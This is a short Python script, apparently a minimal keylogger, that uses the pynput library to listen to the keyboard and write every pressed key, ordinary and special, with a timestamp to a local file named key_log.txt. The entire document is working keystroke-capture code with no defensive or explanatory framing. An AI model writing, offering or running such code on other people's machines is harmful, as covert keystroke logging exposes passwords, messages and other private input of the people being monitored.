from pynput.keyboard import Key, Listener
import logging
log_dir = ""
logging.basicConfig(
    filename=(log_dir + "key_log.txt"),
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')
with Listener(on_press=on_press) as listener:
    listener.join()
